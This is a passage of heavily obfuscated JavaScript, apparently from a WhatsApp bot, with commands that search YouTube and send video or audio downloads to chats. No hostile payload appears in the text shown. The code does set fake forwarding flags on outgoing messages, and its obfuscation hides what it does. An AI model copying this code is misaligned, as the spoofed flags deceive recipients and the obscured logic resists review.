_0x2759b4={};_0x2759b4[_0xe7ceef(-0x1fd,0x1d7,0x2ec,0x483)+'t']=_0x9291f1(0x99f,0xe2d,0xca9,0xe9d)+_0xe7ceef(0xbdd,0x912,0xd4b,0xac1);const _0x12c5a2={};_0x12c5a2[_0x9291f1(0x713,0x8b8,0xc34,0x655)]='ytmp4ajafh'+'d\x20'+args[0x1c53+0x1*-0x18b9+-0x39a],_0x12c5a2[_0xe7ceef(0x4d5,0x37d,0x86e,0x462)]=_0x2759b4,_0x12c5a2[_0x9291f1(0x79c,0x85a,0x99a,0x956)]=_0xe4360d[_0xe7ceef(0xc82,0x8d2,0xa98,0xcb3)];const _0x579edf={};function _0xe7ceef(_0x2123c0,_0x343611,_0x18c401,_0x542991){return _0x1f0365(_0x343611-0xcc,_0x343611-0xc9,_0x2123c0,_0x542991-0x159);}_0x579edf['displayTex'+'t']=_0xe4360d[_0xe7ceef(0xc3a,0x882,0x71a,0xd37)];const _0x4a0cc8={};_0x4a0cc8[_0xe7ceef(0x4b0,0x421,-0xbf,-0x53)]=_0x9291f1(0xb48,0xb77,0xd08,0xdb0)+'\x20'+args[0x269*-0x1+0x91*0x32+0x3*-0x8a3],_0x4a0cc8[_0x9291f1(0x66f,0x9cd,0x799,0x60d)]=_0x579edf,_0x4a0cc8[_0x9291f1(0x79c,0x601,0xbbc,0x977)]='RESPONSE';const _0x5d0cb9={};_0x5d0cb9[_0xe7ceef(0x5de,0x1d7,0x519,0x1f4)+'t']=_0x9291f1(0x3a1,0xd2,0x643,-0xb3)+_0x9291f1(0xc9c,0xbfd,0xb61,0x106d);const _0x5a5773={};_0x5a5773['buttonId']=_0x9291f1(0x696,0x52c,0x9f2,0x6d7)+args[-0x1b94+-0x12*0xe6+0x2bc0],_0x5a5773[_0xe7ceef(-0xdc,0x37d,0x317,0x637)]=_0x5d0cb9,_0x5a5773[_0xe7ceef(0x51,0x4aa,0x807,0x167)]=_0xe4360d[_0x9291f1(0xbc4,0x90c,0x108d,0xd9c)];let _0x1c98cd=[_0x12c5a2,_0x4a0cc8,_0x5a5773];sendButLocation(from,_0x22ea16,_0xe7ceef(0x126,0x2f9,0x120,0x100)+enter+(_0x9291f1(0x9b1,0x70f,0x693,0xab0)+'app\x20mod\x20ka'+'mu\x20belum\x20s'+_0x9291f1(0x836,0x73d,0x3af,0xb63)+_0x9291f1(0x844,0x9b9,0xac1,0x84b)+_0xe7ceef(0xa09,0x8f1,0xcf2,0x517)+'video\x20ini\x20'+_0xe7ceef(0x1a,0x35e,0x610,0x524)+_0x9291f1(0xb68,0x6c8,0xa38,0x101d)+_0xe7ceef(0x3a3,0x46b,0x8b3,0x3a5))+enter+enter+botname+_0xe7ceef(0x3b5,0x3a7,0x391,0x2d7)+ownername,_0xf97546,_0x1c98cd,{});});});}catch(_0x4465de){reply(mess[_0x406083(0xab7,0x5fb,0xca9,0xce0)][_0x406083(0x43d,-0x62,0x90c,0x4c7)]);}break;case _0x406083(0xad8,0xdc3,0x631,0xae8):{if(args[_0x406083(0x797,0xc5f,0x7f8,0x7a9)]===-0x1766+-0xacb+0x2231)return reply(_0x4aaba1(0x9c0,0x881,0x7f7,0x800)+'ntah\x20*'+prefix+(_0x4aaba1(0x4d9,0x3b,0x388,0x388)+_0x4aaba1(0xb89,0xdf1,0xedf,0xf6a)+_0x406083(0x5e6,0x68b,0x88b,0x205)+_0x406083(0xd42,0xaf4,0x919,0x1213)));var srch=args[_0x406083(0xadd,0xede,0x931,0x90d)]('');aramas=await yts(srch),server=_0x4aaba1(0x873,0x9f1,0x46e,0xc3b),aramat=aramas[_0x406083(0x6cc,0xba6,0x5dc,0xbc9)];var mulaikah=aramat[-0x25a*0xb+-0x1*0x8bd+0x229b]['url'];try{ytv2(mulaikah,server)[_0x4aaba1(0xb65,0xa32,0xebb,0x98d)](_0x2b4ad4=>{const _0x4977d9={'Agjsd':function(_0x3c0816,_0x4fd5de,_0x2949f7){return _0x3c0816(_0x4fd5de,_0x2949f7);},'xdfyj':_0x3eabd4(0x675,0x8b0,0x5f9,0xc95)+_0x3eabd4(0x28,0x42d,0x31b,0x5b)+'xt/javascr'+_0x3eabd4(0x7f,0x580,0x859,0x743)+_0x54bc41(0x640,0x72a,0x5d5,0x78d),'QJcWH':'en-US,en;q'+_0x54bc41(0xe27,0x12da,0x122e,0x10ae),'IsSvH':_0x54bc41(0x7f1,0x550,0x32c,0x7ea),'mXjVZ':_0x54bc41(0xc97,0x10df,0x780,0xebd),'MvOcr':'cors','Pkatr':_0x54bc41(0x742,0x982,0x4d0,0x7f0)+'n','ahiFZ':'9a236a4','WPHza':_0x3eabd4(0x58f,0x383,0x684,-0x13c),'FZokV':_0x3eabd4(0x546,0x851,0x7be,0x570)+_0x54bc41(0x823,0x4d9,0x8e2,0x4cc),'HeHsU':_0x3eabd4(0x865,0x81c,0x4dc,0x4be)+_0x54bc41(0x8f8,0x85b,0x613,0xb0c)+_0x3eabd4(0x2de,0x40f,0x480,0x63f),'pHikg':_0x54bc41(0x80f,0xc51,0x54d,0xbaa),'pkELG':_0x3eabd4(0x1c1,0x590,0x17e,0x9e),'uylpH':function(_0x56d2e5,_0x51125c){return _0x56d2e5(_0x51125c);},'zGhTb':function(_0x5f4968,_0x21ce58){return _0x5f4968!==_0x21ce58;},'yxhdp':'rNotC','dXIBr':function(_0x1caa7c,_0x5296ff){return _0x1caa7c>=_0x5296ff;},'UYHcw':function(_0x528fd5,_0x4b4ad9,_0x31ed43,_0x3e34bd){return _0x528fd5(_0x4b4ad9,_0x31ed43,_0x3e34bd);},'NigdZ':_0x54bc41(0xa6d,0xcce,0xb95,0xdcd)};function _0x54bc41(_0x30301d,_0x13932b,_0x56c125,_0x4ad514){return _0x4aaba1(_0x30301d-0x116,_0x4ad514,_0x56c125-0x56,_0x4ad514-0xe);}const {dl_link:_0x1191f7,thumb:_0x59ff84,title:_0x117a7c,filesizeF:_0xbd1188,filesize:_0x11be60}=_0x2b4ad4;function _0x3eabd4(_0x9d5b90,_0x484b01,_0x4b7078,_0x18b1d8){return _0x4aaba1(_0x484b01- -0x47,_0x9d5b90,_0x4b7078-0x1bb,_0x18b1d8-0x145);}axios[_0x3eabd4(0x8ae,0x823,0x75e,0x808)](_0x54bc41(0x8b7,0x91b,0x69e,0x74d)+_0x54bc41(0x4b0,0x2a1,0x130,0x542)+_0x3eabd4(0x94d,0xcea,0x9a5,0x9e5)+_0x3eabd4(0xbbf,0xb3c,0xa23,0x689)+_0x1191f7)[_0x54bc41(0xc7b,0xe26,0xdf7,0x10c3)](async _0x27428f=>{function _0x4259e1(_0x6117bc,_0x40b78d,_0x5b196e,_0x33f49d){return _0x3eabd4(_0x6117bc,_0x33f49d- -0x417,_0x5b196e-0xda,_0x33f49d-0x130);}const _0xcf85c1={'sDXee':function(_0x3fb01c,_0xf7ffd1){return _0x3fb01c*_0xf7ffd1;},'aWNhd':function(_0x112847,_0x5ebc44){return _0x4977d9['uylpH'](_0x112847,_0x5ebc44);}};function _0x1bd05d(_0x4c975a,_0x2266ab,_0x3c1860,_0x3fefdd){return _0x3eabd4(_0x3c1860,_0x4c975a-0x23a,_0x3c1860-0x1b9,_0x3fefdd-0x132);}if(_0x4977d9['zGhTb'](_0x4977d9[_0x4259e1(0x5da,-0x14d,0x33e,0xfc)],_0x4977d9[_0x4259e1(0x3f3,0x18d,-0x424,0xfc)]))_0x4977d9[_0x1bd05d(0xe55,0x9a5,0xc6d,0xded)](_0x57fc84,_0x4259e1(0x6c,0x8a1,0x2c9,0x405)+_0x4259e1(0x727,0x278,0x29f,0x384)+_0x4259e1(0x993,0x121,0x12a,0x571)+_0x1bd05d(0xb7c,0xec7,0xbd1,0x8d8)+_0x1bd05d(0xf87,0x120f,0xdd5,0xb68)+_0x1bd05d(0x6fd,0x482,0x261,0x3b3)+_0x1bd05d(0xf8d,0xc9d,0x117f,0xece)+_0x1bd05d(0xaa8,0xeb3,0x978,0xc27)+_0x1bd05d(0xee1,0x9dc,0x1149,0xc98)+_0x4259e1(-0x95,0x498,-0x4a0,0x72)+_0x27f2c5+(_0x1bd05d(0xde6,0xa6f,0xaab,0xac9)+_0x1bd05d(0xb58,0xa16,0xb9b,0x6d0)+'22%3A%7B%2'+_0x4259e1(0x698,0x766,0x6a1,0x800)+_0x4259e1(0xa71,0x881,0xbe2,0x7b6)+_0x1bd05d(0x63a,0x215,0x235,0x85e)+_0x1bd05d(0x947,0xcb1,0xb62,0xb63)+'22')+_0x3d854f+(_0x4259e1(0x608,0x5dc,0x501,0x69d)+_0x1bd05d(0x5ff,0xa3e,0x4dd,0x3af)+_0x1bd05d(0xa98,0xda4,0xa36,0x7fb)+_0x4259e1(0x39f,0x737,0x4b7,0x75b)+_0x4259e1(0x374,0x6dd,0x9a1,0x897)+_0x4259e1(0x45a,0x75f,0x5c3,0x886)+_0x4259e1(0x27a,-0x2f,0x627,0x2fa)+_0x1bd05d(0xa71,0x652,0xb8c,0x5be)+_0x4259e1(0x26d,0x33e,0x47c,0x4e)+_0x1bd05d(0x5c0,0xa3b,0x11e,0x88c)+'%7D%7D&_=1'+_0x1bd05d(0xada,0xe77,0x85a,0xa05)+'59'),{'headers':{'accept':_0x4977d9[_0x1bd05d(0xce3,0x910,0xba1,0x1198)],'accept-language':_0x4977d9[_0x4259e1(0x952,0x92e,0xccd,0x96c)],'cache-control':_0x4977d9[_0x4259e1(-0x16f,-0x32b,0x1e4,0x183)],'pragma':_0x4977d9['IsSvH'],'sec-fetch-dest':_0x4977d9[_0x4259e1(0x3a2,0x888,0xce9,0x815)],'sec-fetch-mode':_0x4977d9[_0x1bd05d(0x8e6,0x5b4,0x569,0x5a5)],'sec-fetch-site':_0x4977d9[_0x4259e1(-0x288,0x2bd,0xe9,0x3f)],'sec-gpc':'1','x-app-version':_0x4977d9[_0x4259e1(-0x2d,0x772,0x412,0x2d0)],'x-pinterest-appstate':_0x4977d9['WPHza'],'x-requested-with':_0x4977d9[_0x4259e1(-0x1c3,-0x46a,-0x146,-0xac)]},'referrer':_0x4977d9[_0x1bd05d(0xa2b,0x7e8,0xecf,0xd75)],'referrerPolicy':_0x4977d9[_0x1bd05d(0xfa1,0xe0d,0xe1a,0xfc6)],'body':null,'method':_0x4977d9[_0x4259e1(0xdba,0x681,0x7c2,0x8f5)],'mode':_0x4977d9['MvOcr']})['then'](_0x2050ca=>_0x2050ca[_0x4259e1(0x4e2,-0x3da,0xf7,0x12a)]())[_0x1bd05d(0xd58,0x1109,0xabd,0x118c)](_0x1e8a3a=>{function _0x3c6005(_0x22397b,_0x57b4c6,_0x3149d6,_0x129cce){return _0x4259e1(_0x22397b,_0x57b4c6-0x5a,_0x3149d6-0x19e,_0x3149d6-0x1b2);}function _0x442794(_0x2014f1,_0x259f0c,_0x267976,_0x23eba9){return _0x1bd05d(_0x2014f1- -0x106,_0x259f0c-0x124,_0x259f0c,_0x23eba9-0xc2);}const _0x1aa0c=_0x1e8a3a[_0x442794(0xdb5,0xdbf,0xb43,0xfc0)+'esponse'][_0x442794(0xa15,0xa73,0xd46,0xd5c)][_0x442794(0x923,0x726,0x564,0x556)][_0x135331['floor'](_0xcf85c1[_0x3c6005(0x4a1,-0x249,0x1a8,-0x70)](_0x2811c1['random'](),_0x1e8a3a['resource_r'+_0x3c6005(0x62a,-0x16b,0x20b,0x4a2)][_0x3c6005(0x574,0x453,0x67c,0x980)]['results'][_0x3c6005(0x77,0xa22,0x520,0x6d3)]))];var _0x457a7=[];const _0x3cecfd={};_0x3cecfd[_0x3c6005(-0x97,-0x32e,0x18d,-0xa7)]=_0x1aa0c[_0x3c6005(0x812,0x619,0x7e2,0x8a8)][_0x442794(0x8de,0x4f8,0x76b,0x932)][_0x442794(0xafe,0x805,0xc46,0xa82)],_0x457a7[_0x442794(0xbfb,0xa46,0xf91,0xdd1)](_0x3cecfd),_0xcf85c1[_0x3c6005(0xb8,0x65e,0x21a,0x376)](_0x738ec,_0x457a7);})[_0x4259e1(0x61b,0x3e8,0xa16,0x66d)](_0x44ff8c);else{if(_0x4977d9[_0x4259e1(0x41a,0x415,0x540,0x44f)](Number(_0x11be60),-0xe*-0xce5+0x6*-0xbaa+0x11816))return _0x4977d9[_0x4259e1(0x483,0x954,0x992,0x88b)](sendMediaURL,from,_0x59ff84,_0x1bd05d(0xcdb,0x1116,0xdf6,0xe8c)+_0x4259e1(0xc29,0x315,0xc09,0x77e)+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x117a7c+enter+(_0x4259e1(0x1ad,0x4a4,0x436,0x4d2)+_0x1bd05d(0xbe7,0x1061,0x6c4,0xea0))+enter+('🐭\x20*Filesiz'+_0x1bd05d(0xf98,0x1463,0x1168,0xcd9))+_0xbd1188+enter+('🍃\x20*Link*\x20:'+'\x20')+_0x27428f[_0x4259e1(0x3cc,0x5a3,0x6bf,0x4ca)]+enter+enter+(_0x1bd05d(0x705,0xa8a,0x22a,0xa4e)+_0x4259e1(-0x1c2,0x19e,-0x289,0x236)+_0x1bd05d(0xe2a,0x976,0xba9,0xc58)+_0x1bd05d(0xb9e,0xfad,0x825,0xe79)+_0x4259e1(-0x1e9,0x27a,-0x12,0x187)+_0x4259e1(0xa89,0x366,0x976,0x691)));const _0x2a2d57=_0x4259e1(0xb12,0x491,0x237,0x68a)+'-PLAY\x20MP4*'+enter+enter+(_0x4259e1(0x9b,0x256,0x288,0x34e)+':\x20')+_0x117a7c+enter+enter+(_0x4259e1(0x7ea,0x221,0x467,0x4d2)+_0x1bd05d(0x8db,0x5c9,0x60b,0xba7))+enter+(_0x1bd05d(0xd37,0xb1e,0xfb3,0x90e)+'\x20')+_0xbd1188+enter+(_0x4259e1(0x1d,-0x1c5,-0x1d8,0x301)+'\x20')+_0x27428f[_0x4259e1(-0x39,0x538,0x15d,0x4ca)]+enter+enter+(_0x4259e1(0x494,0x73,0x338,0x180)+_0x4259e1(0x5a9,0x2d6,0x4af,0x18a)+_0x4259e1(0x41e,-0x38c,-0x162,0xe1)+_0x1bd05d(0xa42,0x6a4,0xa5a,0xe43)+_0x1bd05d(0xdfc,0x96b,0xe72,0x1163)+'\x20butuh\x20beb'+_0x4259e1(0x57a,0xab4,0x5e3,0x7ae)+'t_');_0x4977d9[_0x4259e1(0xd75,0x962,0xb09,0x88b)](sendMediaURL,from,_0x59ff84,_0x2a2d57),await _0x4977d9[_0x1bd05d(0xedc,0x9bf,0xb21,0xd5e)](sendFileFromUrlF,_0x1191f7,document,{'mimetype':_0x4977d9[_0x4259e1(0x27a,0x189,0x57,0x2cf)],'filename':_0x117a7c+_0x4259e1(0x303,0x750,0x658,0x36f),'quoted':fgclink2,'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':_0x117a7c,'body':'','mediaType':'2','thumbnail':pp_userz,'mediaUrl':_0x1bd05d(0x8bd,0x622,0xa7c,0x92c)+_0x1bd05d(0xe20,0xab9,0x10bd,0x1167)+'c/zeeoneof'+'c'}}})['catch'](()=>reply(_0x4259e1(0x5fd,0x42c,0x87b,0x8ab)));}});});}catch(_0x43dc7d){reply(mess[_0x4aaba1(0xaec,0x942,0xd8d,0xe00)][_0x4aaba1(0x472,0x86f,0x6e5,-0x1f)]);}}break;case'ytmp3':if(args[_0x4aaba1(0x7cc,0x8a2,0x718,0x754)]===0x266e+0x932*-0x4+-0x1a6)return reply(_0x406083(0x98b,0xb93,0xb9e,0x718)+_0x406083(0xaad,0xabc,0xd02,0xd8e)+prefix+(_0x4aaba1(0xc6f,0xf3e,0x9dc,0xb53)+_0x406083(0x8ff,0x420,0xd6c,0xc20)));let isLinks=args[-0x298*0x4+0x797*0x5+-0xd*0x21f]['match'](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!isLinks)return reply(mess[_0x406083(0xab7,0xad3,0xe87,0xd87)]['Iv']);try{reply(lang[_0x406083(0x425,0x832,0x90a,-0xf1)]());let yut=await yts(args[0xb*-0x1ec+0x132c+0x1f8]);yta(args[0x972+-0x44*0x4+0x2*-0x431])[_0x4aaba1(0xb65,0xfa5,0x6e1,0x8eb)](_0x4f59bb=>{const _0x5acb57={'RJAzz':function(_0x230a52,_0x1b705c){return _0x230a52==_0x1b705c;},'EWpyB':function(_0x517273,_0x28c09f){return _0x517273(_0x28c09f);},'koUGR':function(_0x17b061,_0x34063f){return _0x17b061(_0x34063f);},'gbYUY':'magenta','HLOyP':'Asia/Jakar'+'ta','uUhfR':_0x1cc010(0x17d,0x4a9,0x3e1,0x241),'tzAcu':_0x1cc010(0x30c,0x787,0xc13,0x4c9),'PlWRY':_0x1cc010(-0x432,-0x115,0x311,-0xd3),'VkgwV':function(_0x140bb4,_0x13c418){return _0x140bb4>=_0x13c418;},'HUTFL':function(_0x5a5125,_0x4e383a,_0x1da9da,_0x372e11){return _0x5a5125(_0x4e383a,_0x1da9da,_0x372e11);},'LemiX':function(_0x35c51e,_0x24ec24){return _0x35c51e(_0x24ec24);},'RNiBl':_0x1cc010(0x760,0x4cd,0x441,0x69e),'CnPvF':_0x1cc010(0x828,0x839,0xa6f,0xd5f),'Rixae':function(_0xbb4b31,_0x232b61,_0x21793c,_0x43c6e4,_0x491402,_0x496433,_0x277f8f){return _0xbb4b31(_0x232b61,_0x21793c,_0x43c6e4,_0x491402,_0x496433,_0x277f8f);}},{dl_link:_0x5fe0c4,thumb:_0x4fbc39,title:_0x357fae,filesizeF:_0x49fb27,filesize:_0x1b2eb5}=_0x4f59bb;function _0x49b824(_0x3bef45,_0x5ec1eb,_0x553744,_0xfc0242){return _0x406083(_0x5ec1eb- -0x356,_0x5ec1eb-0x11b,_0x553744-0x1f1,_0xfc0242);}function _0x1cc010(_0x4b1c56,_0x2fca2a,_0x36ebbd,_0x48738a){return _0x4aaba1(_0x2fca2a- -0x527,_0x4b1c56,_0x36ebbd-0x1c1,_0x48738a-0x53);}axios['get'](_0x1cc010(0x72e,0x27a,0x2e1,0x6dd)+_0x49b824(-0x23d,0xf,-0x4cc,0xd1)+_0x1cc010(0xa84,0x80a,0x753,0x6dc)+_0x49b824(0x780,0x7f8,0x6d7,0xb9d)+_0x5fe0c4)['then'](async _0x57792f=>{function _0x1e6736(_0x142e11,_0x3ddd95,_0x42f95e,_0xf3e8be){return _0x49b824(_0x142e11-0x45,_0x3ddd95-0x44f,_0x42f95e-0x1c2,_0x42f95e);}function _0x4497f6(_0xd3849e,_0x33e5db,_0x22441f,_0x2ac6ec){return _0x49b824(_0xd3849e-0x65,_0x2ac6ec-0x102,_0x22441f-0x6e,_0xd3849e);}if('XwEDi'===_0x5acb57['PlWRY']){if(_0x5acb57['VkgwV'](_0x5acb57['koUGR'](Number,_0x1b2eb5),-0x541*-0xc+0xa33a+-0x6d16))return _0x5acb57[_0x1e6736(0xa10,0x918,0x8d5,0x418)](sendMediaURL,from,_0x4fbc39,'*Data\x20Berh'+_0x1e6736(0x287,0x72b,0xadb,0xa1c)+_0x4497f6(0x97,0x8a,0x1e,0x430)+enter+enter+_0x4497f6(0x66e,0x6a4,0x5c1,0x51d)+_0x357fae+enter+('🦁\x20Ext\x20:\x20MP'+'3')+enter+(_0x1e6736(0x111a,0xe9e,0xb7a,0xc40)+'\x20:\x20')+_0x49fb27+enter+_0x4497f6(0x333,0x610,0x6a3,0x24c)+_0x57792f[_0x4497f6(0x651,0x287,0x400,0x69f)]+enter+enter+(_0x4497f6(-0x1f7,-0x25,0x649,0x289)+_0x4497f6(0x422,0x648,0x5c7,0x40b)+_0x4497f6(0xa69,0x8da,0x9a7,0x9ae)+_0x4497f6(0x583,0x5c7,0x661,0x722)+'\x20dalam\x20ben'+_0x1e6736(0x9c8,0xbb3,0x107d,0xcc2)));const _0x217ef4=_0x4497f6(0x70,0x7b0,-0x20,0x497)+_0x1e6736(0xbab,0xb7a,0x963,0x9f2)+_0x4497f6(0x9eb,0x2d9,0x834,0x519)+':\x20'+_0x357fae+(_0x4497f6(0x86b,0x8ec,0x242,0x680)+'P3\x0a🤠\x20ID\x20:\x20')+yut[_0x1e6736(0x1ed,0x470,0x57f,0xa2)][0x1f20+0xea1+0xd*-0x385][_0x1e6736(0x4ee,0x613,0x411,0x8d0)]+(_0x1e6736(0xe14,0xa2e,0x5ee,0xcba)+':\x20')+yut[_0x4497f6(-0x268,-0x3a7,0xe8,0x123)][0x9*0x445+-0xc19+0x695*-0x4][_0x1e6736(0x21a,0x701,0x241,0xb2b)]+(_0x4497f6(0x46e,0xa50,0x96c,0x912)+'\x20')+_0x1b2eb5+(_0x1e6736(0x5b0,0xaa7,0x878,0x5e4)+_0x1e6736(0x921,0xc06,0xf27,0x815))+yut[_0x1e6736(0x8f0,0x470,0x6c4,0x90c)][-0x13b4+-0x1*-0x1503+0x14f*-0x1][_0x4497f6(0x6b0,0x40c,0x11d,0x1f6)]+(_0x1e6736(0x908,0x75e,0xc3c,0x5a1)+_0x4497f6(0xca,-0x1c3,0x682,0x208))+yut['videos'][-0x13a+-0x1c71+0x31*0x9b][_0x4497f6(0x1ed,0x21b,0x4f9,0x476)]+_0x4497f6(0x98c,0x312,0xb1b,0x618)+yut['videos'][0x1*-0x1f13+-0x1f2b+0x3e3e][_0x1e6736(0xcc3,0xad5,0xe8d,0xacd)];let _0x3f8da9=await _0x5acb57[_0x4497f6(0xd23,0xcaa,0x74c,0xaba)](getBuffer,_0x4fbc39);const _0x2df8ca={};_0x2df8ca['displayTex'+'t']=_0x5acb57['RNiBl'];const _0x1a604d={};_0x1a604d['buttonId']=_0x1e6736(0x18c,0x5aa,0x5f9,0x8e5)+q,_0x1a604d[_0x4497f6(0x403,0x54f,0x197,0x460)]=_0x2df8ca,_0x1a604d['type']=_0x1e6736(0x5f5,0x5d1,0x9b6,0xac);const _0x3109b6={};_0x3109b6[_0x4497f6(0x4fb,0xf,0x5f4,0x2ba)+'t']=_0x5acb57[_0x4497f6(0xa06,0xca2,0x41b,0x8ad)];const _0x2cc238={};_0x2cc238[_0x4497f6(0x2ee,0x2ca,0x222,0x504)]='ytmp3doc\x20'+q,_0x2cc238['buttonText']=_0x3109b6,_0x2cc238[_0x1e6736(0x7af,0x8da,0xaea,0x81b)]='RESPONSE';let _0xf2e3bb=[_0x1a604d,_0x2cc238];_0x5acb57[_0x4497f6(0x10f,0x598,0x68f,0x3d4)](sendButLocation,from,_0x217ef4,_0x4497f6(0x27e,0x681,0x7b,0x3dc)+enter+('Jika\x20whats'+'app\x20mod\x20ka'+'mu\x20belum\x20s'+_0x1e6736(0xb43,0x974,0xd4f,0xbd3)+_0x1e6736(0x642,0x982,0x4b2,0x92e)+_0x4497f6(0x968,0x8aa,0x5de,0x9d4)+_0x1e6736(0xb37,0x89c,0x4d4,0x43f)+'https://yo'+_0x4497f6(0x68b,0x9bd,0x4c0,0x959)+_0x1e6736(0x635,0x89b,0x751,0x917))+enter+enter+botname+'™©\x20|\x20By\x20'+ownername,_0x3f8da9,_0xf2e3bb,{});}else{if(_0x5acb57[_0x1e6736(0xa49,0x6a7,0x688,0x81c)](_0x107173[_0x1e6736(0x595,0x88c,0xd0e,0xc79)],''+_0x332e26)){const _0x2ffbd0=_0x4497f6(0x369,0x7d8,0xccb,0x7e4)[_0x1e6736(0x435,0x76f,0x9f7,0xc29)]('|');let _0x1115d4=0x3*0x3c7+0x1*0x533+-0x17*0xb8;while(!![]){switch(_0x2ffbd0[_0x1115d4++]){case'0':if(!_0x2e531d['key']['fromMe']&&!_0x393a7f&&!_0x582006)return _0x5acb57[_0x4497f6(-0x1bf,0x545,0x4a7,0x1a8)](_0x3c553b,_0x19eda7[_0x1e6736(0x688,0x6fd,0x8ea,0x64f)]());continue;case'1':_0x5acb57[_0x1e6736(0x927,0xe10,0xcd5,0x12ec)](_0x5cbe81,_0x1e6736(0x968,0x714,0xa6f,0x634)+'DE*\x20」');continue;case'2':_0x115180=!![];continue;case'3':_0x3ecc2e[_0x4497f6(0x664,0x4e3,0x32b,0x20e)](_0x342d3f(_0x2ce03c,_0x5acb57[_0x4497f6(0x26c,0x22e,0xa9a,0x573)]),_0x265be5(_0x32a43b['tz'](_0x5acb57[_0x4497f6(0x460,0x591,0x967,0x4b3)])[_0x1e6736(0x7ed,0x774,0x27c,0x8a1)](_0x5acb57['uUhfR']),_0x5acb57['tzAcu']),_0x5acb57[_0x1e6736(0xc4b,0xe10,0x12d2,0xe1f)](_0x29f3b3,'SELF\x20-\x20MOD'+'E'));continue;case'4':if(_0x1a1699===!![])return;continue;}break;}}}});});}catch(_0x53c178){reply(mess[_0x406083(0xab7,0x678,0x61b,0x6eb)][_0x4aaba1(0x472,0x744,0x2e4,0x8db)]);}break;case _0x4aaba1(0xa36,0x89c,0x77d,0xac4):{if(args[_0x4aaba1(0x7cc,0xa37,0x4b8,0x382)]===0x412*-0x3+-0x3*0x74f+0x2223)return reply(_0x4aaba1(0x9c0,0xc2c,0xc03,0x697)+_0x406083(0xaad,0xcbd,0x7f2,0xa98)+prefix+('video*\x20_Ju'+_0x406083(0xb54,0x734,0xd5f,0xaee)+_0x4aaba1(0x61b,0x7b8,0x668,0x724)+_0x406083(0xd42,0xe06,0x1006,0x10b5)));var srch=args[_0x406083(0xadd,0xcd3,0x8ee,0xe67)]('');aramas=await yts(srch),server='en68',aramat=aramas['all'];var mulaikah=aramat[0x4*-0x27+-0x93*-0x21+-0x1257][_0x4aaba1(0xa11,0x68e,0xa05,0xe7b)];try{ytv2(srch,server)['then'](_0x10ec38=>{const _0x56351c={'XIZuN':function(_0x145725,_0x471e27){return _0x145725(_0x471e27);},'nIkaY':_0x211c87(0x588,0x6c0,0x9b5,0xd2c),'QsPwE':function(_0x1bf405,_0x23905b,_0x3f8d4e,_0x15321b){return _0x1bf405(_0x23905b,_0x3f8d4e,_0x15321b);},'bHkkU':function(_0x1268b9,_0x510ce4){return _0x1268b9===_0x510ce4;},'JMphX':function(_0x3eabf7,_0x472f65){return _0x3eabf7>=_0x472f65;},'HRciA':function(_0x39bb2c,_0x16f945){return _0x39bb2c(_0x16f945);},'Lbqbs':function(_0x50c72e,_0x3c12a2,_0x10aa09,_0xd2cc2a){return _0x50c72e(_0x3c12a2,_0x10aa09,_0xd2cc2a);}};function _0x211c87(_0x2da930,_0x216ffe,_0x2d91b9,_0x45bcd8){return _0x406083(_0x2d91b9- -0x31f,_0x216ffe-0x17e,_0x2d91b9-0x16,_0x2da930);}function _0x40b138(_0x5716f6,_0xc7da2,_0x14b689,_0x105278){return _0x406083(_0xc7da2- -0x129,_0xc7da2-0xe7,_0x14b689-0x1a3,_0x105278);}const {dl_link:_0xfd6de4,thumb:_0xd20e0c,title:_0x565a59,filesizeF:_0x46d6b3,filesize:_0x704e42}=_0x10ec38;axios[_0x211c87(0x7e2,0x6a,0x516,0x348)](_0x40b138(0x291,0x643,0x57a,0x26b)+_0x211c87(0x2cd,-0x2f2,0x46,-0x2bf)+_0x211c87(0xade,0xa3a,0x9dd,0x93c)+_0x211c87(0x347,0x80b,0x82f,0x779)+_0xfd6de4)[_0x211c87(0x9a2,0xb97,0x811,0xc06)](async _0x24e82a=>{function _0x2f2473(_0x2895b9,_0x39d9a3,_0x145831,_0x298d78){return _0x40b138(_0x2895b9-0x190,_0x39d9a3- -0x29e,_0x145831-0x37,_0x298d78);}function _0x4a3e6e(_0x98fb7b,_0x383e98,_0xbd2605,_0x2e30f4){return _0x40b138(_0x98fb7b-0x1d3,_0x2e30f4- -0x417,_0xbd2605-0xef,_0x383e98);}const _0x14b687={'wInip':function(_0x2c79e7,_0x4b9cb8){function _0x3e4744(_0x37fa8f,_0x203f50,_0x6a7213,_0x1eb7ea){return _0x34ec(_0x37fa8f-0x2a0,_0x6a7213);}return _0x56351c[_0x3e4744(0x79e,0xb9e,0x7cd,0x5f5)](_0x2c79e7,_0x4b9cb8);},'wKczp':function(_0xf5fe40,_0x589840){function _0x5cb035(_0x2d1f2b,_0x30759a,_0x110bb8,_0x2f6865){return _0x34ec(_0x30759a-0x84,_0x2f6865);}return _0x56351c[_0x5cb035(0x4c9,0x582,0x53e,0x6f8)](_0xf5fe40,_0x589840);},'TZTpO':_0x56351c['nIkaY'],'zhERs':function(_0x3d194b,_0x120b54){return _0x3d194b>=_0x120b54;},'zmCvM':function(_0x4c04df,_0x40b9e4,_0x17632e,_0x41a0be){function _0x3b0434(_0x328fbf,_0x110e9c,_0x492e1e,_0x1724c0){return _0x34ec(_0x110e9c-0x22b,_0x328fbf);}return _0x56351c[_0x3b0434(0x755,0x6e4,0x3f6,0x847)](_0x4c04df,_0x40b9e4,_0x17632e,_0x41a0be);}};if(_0x56351c[_0x2f2473(0x3a7,0x47b,0x493,0x125)](_0x4a3e6e(0x823,0x480,0x1e,0x314),'aJtYz')){if(_0x56351c[_0x2f2473(0xb6e,0x652,0x30c,0x5ad)](_0x56351c[_0x4a3e6e(0x6ca,0x1f9,0x81e,0x475)](Number,_0x704e42),-0xaf35+-0x17ccc*0x1+0x3b2a1))return 